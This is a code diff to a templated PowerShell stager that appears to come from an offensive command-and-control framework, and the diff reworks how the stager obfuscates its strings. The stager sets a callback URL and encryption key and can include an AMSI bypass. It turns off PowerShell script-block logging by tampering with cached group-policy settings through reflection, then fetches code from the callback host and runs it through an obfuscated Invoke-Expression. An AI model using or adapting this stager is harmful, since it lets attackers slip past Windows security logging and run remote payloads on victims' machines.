@@ -1,3 +1,4 @@
+{% from 'macros.jinja2' import obfuscate with context%}
 ${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
 ${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 
@@ -14,41 +15,29 @@ function {{symbol_name("Decrypt-String")}} {
     $result
 }
 
-{# strings used for disabling powershell logging #}
-{% set strings = [
-    "Bypass.AMSI",
-    "System.Management.Automation.Utils",
-    "cachedGroupPolicySettings",
-    "NonPublic,Static",
-    "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
-    "EnableScriptBlockLogging",
-    "Failed to disable AMSI, aborting",
-    "0",
-]%}
-
 {% if exec_clipboard_entry %}
     ${{symbol_name("clip_entry")}} = "{{exec_clipboard_entry|rc4encrypt}}"
 {% else %}
     ${{symbol_name("clip_entry")}} = ""
 {% endif %}
 
-{% for s in strings %}
-    ${{symbol_name("obfuscated_str")}}{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
-{% endfor %}
-
-
-
 if ($PSVersionTable.PSVersion.Major -ge 5) {
     {% if amsibypass %}
         {% include amsibypass %}
     {% endif %}
 
-    {# Disable Logging #}
-    ${{symbol_name("settings")}} = [Ref].Assembly.GetType(${{symbol_name("obfuscated_str")}}2).GetField(${{symbol_name("obfuscated_str")}}3,${{symbol_name("obfuscated_str")}}4).GetValue($null);
-    ${{symbol_name("settings")}}[${{symbol_name("obfuscated_str")}}5] = @{}
-    ${{symbol_name("settings")}}[${{symbol_name("obfuscated_str")}}5].Add(${{symbol_name("obfuscated_str")}}6, ${{symbol_name("obfuscated_str")}}8)
-}
+    {# Disable Logging. See https://www.cobbr.io/ScriptBlock-Logging-Bypass.html
+        $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+        $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
+        $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+        $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
+    #}
 
+    ${{symbol_name("settings")}} = [Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}({{obfuscate("System.Management.Automation.Utils")}}).GetField({{obfuscate("cachedGroupPolicySettings")}},{{obfuscate("NonPublic,Static")}}).GetValue($null);
+    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}] = @{}
+    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}].Add({{obfuscate("EnableScriptBlockLogging")}},{{obfuscate("0")}})
+    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}].Add({{obfuscate("EnableScriptBlockInvocationLogging")}},{{obfuscate("0")}})
+}
 
 {% if transport in ['http', 'https'] %}
     ${{symbol_name("WebClient")}} = $K{# defined in the launcher #}
@@ -67,4 +56,4 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
 ${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "h"
 
 
-& (g`Cm ({{symbol_name("Decrypt-String")}} "{{'Invoke-Expression'|rc4encrypt}}")) ${{symbol_name("Code")}}
+& (g`Cm {{obfuscate("Invoke-Expression")}}) ${{symbol_name("Code")}}
